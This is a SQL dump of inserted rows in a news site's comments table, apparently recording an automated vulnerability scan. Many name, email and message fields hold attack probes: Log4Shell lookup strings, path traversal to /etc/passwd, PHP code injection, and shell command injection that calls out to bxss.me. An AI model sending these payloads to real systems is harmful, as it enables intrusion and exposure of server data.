INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87991, 60238, 'pHqghUme', '../sample@email.tst', '1', 0, '2024-08-01 11:37:04', '1403/5/11', '11:37:04 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87992, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:37:06', '1403/5/11', '11:37:06 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87993, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:37:06', '1403/5/11', '11:37:06 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87995, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:37:08', '1403/5/11', '11:37:08 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87998, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:37:12', '1403/5/11', '11:37:12 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88000, 60238, '', 'sample@email.tst', '1', 0, '2024-08-01 11:37:12', '1403/5/11', '11:37:12 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88001, 60238, 'pHqghUme', '+"A".concat(70-3', '1', 0, '2024-08-01 11:37:12', '1403/5/11', '11:37:12 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88002, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:37:14', '1403/5/11', '11:37:14 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88003, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:37:14', '1403/5/11', '11:37:14 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88004, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:37:15', '1403/5/11', '11:37:15 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88005, 60238, 'pHqghUme', '.gethostbyname(lc(\'\'hitgt\'\'.\'\'xcfzrdcdefcbd.bxss.me.', '1', 0, '2024-08-01 11:37:17', '1403/5/11', '11:37:17 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88006, 60238, 'pHqghUme', 'sample@email.tst', 'HttP://bxss.me/t/xss.html?%00', 0, '2024-08-01 11:37:17', '1403/5/11', '11:37:17 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88007, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:37:19', '1403/5/11', '11:37:19 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88008, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:37:19', '1403/5/11', '11:37:19 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88009, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:37:20', '1403/5/11', '11:37:20 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88010, 60238, 'pHqghUme', '.gethostbyname(lc("hitoc"."onxownayac2a4.bxss.me.', '1', 0, '2024-08-01 11:37:20', '1403/5/11', '11:37:20 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88011, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:37:20', '1403/5/11', '11:37:20 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88012, 60238, '�💡\'\'"><&;|${${lower:j}${::-n}d${upper:ı}:dns${::-:}//hitinmkbdsalj4601a${::-.}bxss.me}AAAAAAAAAAAAAA', 'sample@email.tst', '1', 0, '2024-08-01 11:37:23', '1403/5/11', '11:37:23 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88013, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:37:23', '1403/5/11', '11:37:23 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88014, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:37:25', '1403/5/11', '11:37:25 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88015, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:37:25', '1403/5/11', '11:37:25 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88016, 60238, 'pHqghUme', '', '1', 0, '2024-08-01 11:37:26', '1403/5/11', '11:37:26 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88017, 60238, 'pHqghUme', '+\'\'A\'\'.concat(70-3', '1', 0, '2024-08-01 11:37:26', '1403/5/11', '11:37:26 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88018, 60238, 'pHqghUme', './sample@email.tst', '1', 0, '2024-08-01 11:37:27', '1403/5/11', '11:37:27 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88019, 60238, 'pHqghUme', 'sample@email.tst', 'bxss.me/t/xss.html?%00', 0, '2024-08-01 11:37:27', '1403/5/11', '11:37:27 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88020, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:37:28', '1403/5/11', '11:37:28 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88021, 60238, 'pHqghUme', '!((', '1', 0, '2024-08-01 11:37:28', '1403/5/11', '11:37:28 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88024, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:37:31', '1403/5/11', '11:37:31 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88025, 60238, 'pHqghUme', 'HttP://bxss.me/t/xss.html?%00', '1', 0, '2024-08-01 11:37:33', '1403/5/11', '11:37:33 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88026, 60238, '${${:::::::::::::::::-j}ndi:dns${:::::::::::::::::-:}//dns.log4j.074625.5598-1766.5598.af3ca${::-.}1', 'sample@email.tst', '1', 0, '2024-08-01 11:37:33', '1403/5/11', '11:37:33 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88027, 60238, 'pHqghUme', '^(#$!@#$', '1', 0, '2024-08-01 11:37:33', '1403/5/11', '11:37:33 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88028, 60238, 'pHqghUme', 'bxss.me/t/xss.html?%00', '1', 0, '2024-08-01 11:37:35', '1403/5/11', '11:37:35 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88029, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:37:37', '1403/5/11', '11:37:37 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88030, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:37:37', '1403/5/11', '11:37:37 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88032, 60238, 'HttP://bxss.me/t/xss.html?%00', 'sample@email.tst', '1', 0, '2024-08-01 11:37:38', '1403/5/11', '11:37:38 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88033, 60238, 'pHqghUme', 'sample@email.tst', 'http://some-inexistent-website.acu/some_inexistent_file_with_long_name?.jpg', 0, '2024-08-01 11:37:38', '1403/5/11', '11:37:38 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88036, 60238, '../../../../../../../../../../../../../../etc/passwd', 'sample@email.tst', '1', 0, '2024-08-01 11:37:40', '1403/5/11', '11:37:40 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88037, 60238, 'bxss.me/t/xss.html?%00', 'sample@email.tst', '1', 0, '2024-08-01 11:37:40', '1403/5/11', '11:37:40 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88038, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:37:41', '1403/5/11', '11:37:41 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88040, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:37:41', '1403/5/11', '11:37:41 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88041, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:37:41', '1403/5/11', '11:37:41 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88045, 60238, 'pHqghUme', 'sample@email.tst', '1some_inexistent_file_with_long_name .jpg', 0, '2024-08-01 11:37:44', '1403/5/11', '11:37:44 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88046, 60238, '../../../../../../../../../../../../../../windows/win.ini', 'sample@email.tst', '1', 0, '2024-08-01 11:37:45', '1403/5/11', '11:37:45 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88048, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:37:46', '1403/5/11', '11:37:46 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88050, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:37:46', '1403/5/11', '11:37:46 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88051, 60238, 'pHqghUme', 'sample@email.tst', 'Http://bxss.me/t/fit.txt', 0, '2024-08-01 11:37:49', '1403/5/11', '11:37:49 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88052, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:37:49', '1403/5/11', '11:37:49 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88053, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:37:50', '1403/5/11', '11:37:50 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88054, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:37:51', '1403/5/11', '11:37:51 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88056, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:37:55', '1403/5/11', '11:37:55 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88057, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:37:56', '1403/5/11', '11:37:56 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88058, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:37:56', '1403/5/11', '11:37:56 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88060, 60238, 'pHqghUme', 'sample@email.tst', 'ews.aspx', 0, '2024-08-01 11:37:57', '1403/5/11', '11:37:57 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88061, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:37:57', '1403/5/11', '11:37:57 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88062, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:37:58', '1403/5/11', '11:37:58 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88064, 60238, 'pHqghUme', 'sample@email.tst', 'http://bxss.me/t/fit.txt?.jpg', 0, '2024-08-01 11:37:59', '1403/5/11', '11:37:59 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88065, 60238, 'pHqghUme', 'sample@email.tst', '', 0, '2024-08-01 11:38:00', '1403/5/11', '11:38:00 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88066, 60238, '../pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:38:01', '1403/5/11', '11:38:01 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88067, 60238, 'pHqghUme', 'sample@email.tst', 'ews.aspx ', 0, '2024-08-01 11:38:05', '1403/5/11', '11:38:05 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88068, 60238, 'pHqghUme', 'sample@email.tst', 'bxss.me', 0, '2024-08-01 11:38:05', '1403/5/11', '11:38:05 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88069, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:38:05', '1403/5/11', '11:38:05 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88071, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:38:08', '1403/5/11', '11:38:08 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88072, 60238, 'pHqghUme', ';assert(base64_decode(\'\'cHJpbnQobWQ1KDMxMzM3KSk7', '1', 0, '2024-08-01 11:38:09', '1403/5/11', '11:38:09 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88073, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:38:09', '1403/5/11', '11:38:09 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88074, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:38:10', '1403/5/11', '11:38:10 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88075, 60238, 'pHqghUme', 'sample@email.tst', 'ews.aspx/.', 0, '2024-08-01 11:38:10', '1403/5/11', '11:38:10 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88076, 60238, 'pHqghUme', '', '1', 0, '2024-08-01 11:38:10', '1403/5/11', '11:38:10 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88078, 60238, 'pHqghUme', ';print(md5(31337', '1', 0, '2024-08-01 11:38:12', '1403/5/11', '11:38:12 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88079, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:38:13', '1403/5/11', '11:38:13 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88080, 60238, 'pHqghUme', 'http://some-inexistent-website.acu/some_inexistent', '1', 0, '2024-08-01 11:38:14', '1403/5/11', '11:38:14 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88081, 60238, 'pHqghUme', 'ews.aspx', '1', 0, '2024-08-01 11:38:14', '1403/5/11', '11:38:14 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88083, 60238, '', 'sample@email.tst', '1', 0, '2024-08-01 11:38:14', '1403/5/11', '11:38:14 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88084, 60238, 'pHqghUme', 'ews.aspx ', '1', 0, '2024-08-01 11:38:15', '1403/5/11', '11:38:15 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88085, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:38:15', '1403/5/11', '11:38:15 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88086, 60238, 'pHqghUme', ';print(md5(31337', '1', 0, '2024-08-01 11:38:15', '1403/5/11', '11:38:15 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88087, 60238, 'pHqghUme', '1some_inexistent_file_with_long_name .tst', '1', 0, '2024-08-01 11:38:16', '1403/5/11', '11:38:16 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88089, 60238, 'pHqghUme', 'ews.aspx/.', '1', 0, '2024-08-01 11:38:17', '1403/5/11', '11:38:17 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88090, 60238, 'ews.aspx', 'sample@email.tst', '1', 0, '2024-08-01 11:38:20', '1403/5/11', '11:38:20 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88091, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:38:20', '1403/5/11', '11:38:20 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88092, 60238, 'pHqghUme', 'Http://bxss.me/t/fit.txt', '1', 0, '2024-08-01 11:38:20', '1403/5/11', '11:38:20 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88093, 60238, 'pHqghUme', '${@print(md5(31337', '1', 0, '2024-08-01 11:38:20', '1403/5/11', '11:38:20 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88094, 60238, 'ews.aspx ', 'sample@email.tst', '1', 0, '2024-08-01 11:38:23', '1403/5/11', '11:38:23 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88095, 60238, 'ews.aspx/.', 'sample@email.tst', '1', 0, '2024-08-01 11:38:25', '1403/5/11', '11:38:25 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88096, 60238, 'pHqghUme', 'http://bxss.me/t/fit.txt?.tst', '1', 0, '2024-08-01 11:38:27', '1403/5/11', '11:38:27 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88097, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:38:29', '1403/5/11', '11:38:29 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88099, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:38:29', '1403/5/11', '11:38:29 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88100, 60238, 'pHqghUme', '${@print(md5(31337', '1', 0, '2024-08-01 11:38:30', '1403/5/11', '11:38:30 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88101, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:38:30', '1403/5/11', '11:38:30 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88102, 60238, 'pHqghUme', '.print(md5(31337', '1', 0, '2024-08-01 11:38:31', '1403/5/11', '11:38:31 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88103, 60238, 'pHqghUme', 'bxss.me', '1', 0, '2024-08-01 11:38:32', '1403/5/11', '11:38:32 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88106, 60238, 'http://some-inexistent-website.acu/some_inexistent_file_with_long_name?.jpg', 'sample@email.tst', '1', 0, '2024-08-01 11:38:33', '1403/5/11', '11:38:33 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88109, 60238, '1some_inexistent_file_with_long_name .jpg', 'sample@email.tst', '1', 0, '2024-08-01 11:38:35', '1403/5/11', '11:38:35 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88111, 60238, 'Http://bxss.me/t/fit.txt', 'sample@email.tst', '1', 0, '2024-08-01 11:38:36', '1403/5/11', '11:38:36 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88113, 60238, 'pHqghUme', 'echo zxscqj$(', '1', 0, '2024-08-01 11:38:40', '1403/5/11', '11:38:40 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88115, 60238, 'http://bxss.me/t/fit.txt?.jpg', 'sample@email.tst', '1', 0, '2024-08-01 11:38:45', '1403/5/11', '11:38:45 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88116, 60238, 'pHqghUme', '&echo vvcafd$(', '1', 0, '2024-08-01 11:38:47', '1403/5/11', '11:38:47 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88117, 60238, 'bxss.me', 'sample@email.tst', '1', 0, '2024-08-01 11:38:49', '1403/5/11', '11:38:49 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88118, 60238, 'pHqghUme', '|echo qdjubz$(', '1', 0, '2024-08-01 11:38:51', '1403/5/11', '11:38:51 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88119, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:38:53', '1403/5/11', '11:38:53 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88122, 60238, 'pHqghUme', '(nslookup hitizeovkufskf2a80.bxss.me||perl -e "get', '1', 0, '2024-08-01 11:38:57', '1403/5/11', '11:38:57 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88123, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:38:58', '1403/5/11', '11:38:58 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88124, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:39:04', '1403/5/11', '11:39:04 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88125, 60238, 'pHqghUme', '$(nslookup hitrhifcftdjo23cf8.bxss.me||perl -e "ge', '1', 0, '2024-08-01 11:39:05', '1403/5/11', '11:39:05 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88126, 60238, 'pHqghUme', '&(nslookup hitqnewtwvvoif2a44.bxss.me||perl -e "ge', '1', 0, '2024-08-01 11:39:07', '1403/5/11', '11:39:07 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88127, 60238, 'pHqghUme', '|(nslookup hitnxuvnvjbak81656.bxss.me||perl -e "ge', '1', 0, '2024-08-01 11:39:08', '1403/5/11', '11:39:08 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88128, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:39:09', '1403/5/11', '11:39:09 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88129, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:39:11', '1403/5/11', '11:39:11 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88130, 60238, 'pHqghUme', '`(nslookup hithlgocdnrnfede63.bxss.me||perl -e "ge', '1', 0, '2024-08-01 11:39:13', '1403/5/11', '11:39:13 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88131, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:39:18', '1403/5/11', '11:39:18 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88132, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:39:20', '1403/5/11', '11:39:20 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88133, 60238, 'pHqghUme', ';(nslookup hituqtakplyrm660b7.bxss.me||perl -e "ge', '1', 0, '2024-08-01 11:39:20', '1403/5/11', '11:39:20 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88134, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:39:24', '1403/5/11', '11:39:24 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88137, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:39:26', '1403/5/11', '11:39:26 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88139, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:39:30', '1403/5/11', '11:39:30 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88141, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:39:39', '1403/5/11', '11:39:39 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88147, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:40:02', '1403/5/11', '11:40:02 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88148, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:40:03', '1403/5/11', '11:40:03 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88149, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:40:08', '1403/5/11', '11:40:08 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88150, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:40:10', '1403/5/11', '11:40:10 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88151, 60238, 'pHqghUme', 'sample@email.tst', '1', 0, '2024-08-01 11:40:11', '1403/5/11', '11:40:11 AM');
